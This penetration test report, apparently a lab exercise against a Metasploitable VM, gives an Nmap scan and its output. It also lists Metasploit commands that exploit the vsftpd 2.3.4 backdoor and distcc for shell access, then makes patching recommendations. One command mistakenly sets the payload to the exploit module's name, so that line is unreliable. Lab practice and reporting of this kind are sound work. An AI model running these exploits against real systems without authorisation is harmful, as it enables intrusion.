### Penetration Testing Report

#### Executive Summary

**Objective:**  
To identify and remediate vulnerabilities within the target network through ethical intrusions.

**Key Findings:**  
Multiple critical vulnerabilities were identified and exploited, demonstrating significant risks to the network.

#### Methodology

**Planning Phase:**  
-> Defined objectives, scope, and rules of engagement.
-> Identified Metasploitable as the target system.

**Information Gathering:**  
-> Utilized Nmap for network scanning and enumeration.
  -> Command: `nmap -sS -sV -A <Metasploitable_IP>`

**Vulnerability Analysis:**  
-> Identified vulnerabilities using Metasploit and manual techniques.

**Exploitation:**  
-> Successfully exploited several vulnerabilities using Metasploit.

**Post-Exploitation Analysis:** 
-> Evaluated the impact and gathered sensitive data.

#### Findings

1. **Vulnerability 1: vsftpd 2.3.4 Backdoor**
     **Description:** A backdoor vulnerability in vsftpd 2.3.4.
     **Impact:** Allowed unauthorized remote access.
     **Exploit Used:** Metasploit `exploit/unix/ftp/vsftpd_234_backdoor`.
     **Evidence:** Screenshot of successful exploit and shell access.

2. **Vulnerability 2: Distcc Daemon Command Execution**
     **Description:** Remote code execution vulnerability in Distcc.
     **Impact:** Allowed arbitrary command execution.
     **Exploit Used:** Metasploit `exploit/unix/misc/distcc_exec`.
     **Evidence:** Command output showing root access.

#### Recommendations

  **Patch vsftpd to the latest version.**
  **Disable or restrict access to the Distcc daemon.**
  **Implement regular vulnerability scanning and patch management.**
  **Enhance network segmentation and access controls.**

#### Supporting Evidence

1. **Nmap Scan Results:**
   ```text
       Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-12 13:45 EDT
     Nmap scan report for 192.168.10.4
     Host is up (0.0036s latency).
     Not shown: 977 closed tcp ports (conn-refused)
     PORT     STATE SERVICE     VERSION
     21/tcp   open  ftp         vsftpd 2.3.4
     22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
     23/tcp   open  telnet      Linux telnetd
     25/tcp   open  smtp        Postfix smtpd
     53/tcp   open  domain      ISC BIND 9.4.2
     80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
     111/tcp  open  rpcbind     2 (RPC #100000)
     139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
     445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
     512/tcp  open  exec        netkit-rsh rexecd
     513/tcp  open  login       OpenBSD or Solaris rlogind
     514/tcp  open  tcpwrapped
     1099/tcp open  java-rmi    GNU Classpath grmiregistry
     1524/tcp open  bindshell   Metasploitable root shell
     2049/tcp open  nfs         2-4 (RPC #100003)
     2121/tcp open  ftp         ProFTPD 1.3.1
     3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
     5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
     5900/tcp open  vnc         VNC (protocol 3.3)
     6000/tcp open  X11         (access denied)
     6667/tcp open  irc         UnrealIRCd
     8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
     8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
     Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .     
     Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds

   ```

2. **vsftpd 2.3.4 Backdoor Exploit:**
    Command: 
     ```text
     use exploit/unix/ftp/vsftpd_234_backdoor
     set RHOST 192.168.10.4
	 set payload exploit/unix/ftp/vsftpd_234_backdoor
     run
     ```
    Evidence: Screenshot of successful exploit showing shell access.

3. **Distcc Daemon Command Execution:**
    Command: 
     ```text
     use exploit/unix/misc/distcc_exec
     set RHOST 192.168.10.4
     run
     ```
    Evidence: Command output showing root access.

